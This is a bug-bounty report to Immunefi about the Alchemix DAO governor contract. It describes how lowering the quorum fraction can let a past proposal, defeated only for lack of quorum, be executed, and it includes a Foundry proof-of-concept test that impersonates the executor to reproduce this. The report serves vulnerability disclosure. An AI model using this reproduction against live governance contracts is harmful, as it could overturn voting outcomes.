# 30926 - \[SC - Low] AlchemixGovernor updates to quorum can affect p...

Submitted on May 8th 2024 at 13:10:54 UTC by @Lastc0de for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #30926

Report type: Smart Contract

Report severity: Low

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/AlchemixGovernor.sol>

Impacts:

* Manipulation of governance voting result deviating from voted outcome and resulting in a direct change from intended effect of original results

## Description

## Brief/Intro

In governance, there are usually proposals that for some reason (such as lack of quorum, and the number of votes ) defetated. This issue concerns instances of Governor that use the module `GovernorVotesQuorumFraction` In your protocol it is known as L2GovernorVotesQuorumFraction :

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/governance/L2GovernorVotesQuorumFraction.sol>

GovernorVotesQuorumFraction: Combines with GovernorVotes to set the quorum as a fraction of the total token supply. AlchemixGovernor inherits this module

```
contract AlchemixGovernor is L2Governor, L2GovernorVotes, L2GovernorVotesQuorumFraction /* @AUDIT */, L2GovernorCountingSimple
```

So this make vulnerable AlchemixGovernor contract.

If this report is unclear to you, refer to the reference link

## Vulnerability Details

Vulnerable contract is `AlchemixGovernor.sol` && `L2GovernorVotesQuorumFraction.sol`

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/governance/L2GovernorVotesQuorumFraction.sol>

Vulnerable function is `quorum()` :

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/governance/L2GovernorVotesQuorumFraction.sol#L49C1-L51C6>

```
    function quorum(uint256 blockTimestamp) public view virtual override returns (uint256) {
        return (token.getPastTotalSupply(blockTimestamp) * quorumNumerator()) / quorumDenominator();
    }
```

The `token.getPastTotalSupply(blockNumber)` call will not be optimized the same way and, A mechanism that determines quorum requirements as a percentage of the voting token's total supply. when a proposal is passed to lower the quorum requirement, past proposals may become executable if they had been defeated only due to lack of quorum, and the number of votes it received meets the new quorum requirement.

## Impact Details

Past proposals may become executable if they had been defeated only due to lack of quorum, and the number of votes it received meets the new quorum requirement.

## References

<https://github.com/OpenZeppelin/openzeppelin-contracts/security/advisories/GHSA-xrc4-737v-9q75>

<https://docs.openzeppelin.com/contracts/4.x/api/governance>

## Proof of Concept

* To manually prank the executer and call a function with `onlyGovernance` modifier we need add calldata to queue:

1- Add the following function ro `L2Governor.sol` file

```
        function pushCalldata(bytes calldata hash) public {
        _governanceCall.pushBack(keccak256(hash));
    }
```

2- Add following function to `AlchemixGovernor.t.sol` file

```
function test_Execute_Defeated_Proposal_After_Update_Quorum() public {
    // Random users
        address jimmy = 0xc8dF939C61A33Aa83435bddcE76e6179f4653302;
    address sara = 0x72414Fe88759857e69797B4558a1f1475F32A462;
   
        createVeAlcx(sara, 5000e18, MAXTIME, false);
        createVeAlcx(jimmy, 15_000e18, MAXTIME, false);
       
        assertFalse(voter.isWhitelisted(usdc));

        (address[] memory t, uint256[] memory v, bytes[] memory c, string memory d) = craftTestProposal();

        hevm.warp(block.timestamp + 2 days); // delay

        uint256 quorum = governor.quorum(block.timestamp);
        uint256 votingPower = veALCX.getVotes(admin);

        assertGt(votingPower, quorum, "voting power should be greater than quorum");

        // propose
        hevm.startPrank(admin);
        uint256 pid = governor.propose(t, v, c, d, MAINNET);
        hevm.warp(block.timestamp + governor.votingDelay() + 1); // voting delay
        hevm.roll(block.number + 1);
        hevm.stopPrank();

        // vote by sara
        hevm.startPrank(sara);
        governor.castVote(pid, 1);
        hevm.stopPrank();
        // vote by jimmy
        hevm.startPrank(jimmy);
        governor.castVote(pid, 1);
        hevm.warp(block.timestamp + governor.votingPeriod() + 1); // voting period
        hevm.stopPrank();

        // execute
        hevm.startPrank(admin);
        hevm.warp(block.timestamp + timelockExecutor.executionDelay() + 1); // execution delay
        hevm.expectRevert(abi.encodePacked("Governor: proposal not successful"));
        governor.execute(t, v, c, keccak256(bytes(d)), MAINNET);

        hevm.warp(block.timestamp + governor.votingPeriod() + 10); // update timestamp
        hevm.stopPrank();
       
        // Update quorum numerator with governance

        address executor = address(governor.timelock());

        // Prepare the calldata
        bytes memory calldataRequired = abi.encodeWithSelector(
        bytes4(keccak256("updateQuorumNumerator(uint256)")),1000);

        // Add it to the queue
        governor.pushCalldata(calldataRequired);

        hevm.startPrank(address(executor));

        // Impersonate the executor and call the function
        // Update.
        governor.updateQuorumNumerator(1000);

        hevm.stopPrank();

        // Execute past defeated Proposal
        governor.execute(t, v, c, keccak256(bytes(d)), MAINNET);


        assertTrue(voter.isWhitelisted(usdc));
    }
```

3- Run test

```
forge test --match-test "test_Execute_Defeated_Proposal_After_Update_Quorum" --fork-url https://eth-mainnet.public.blastapi.io -vvvv
```
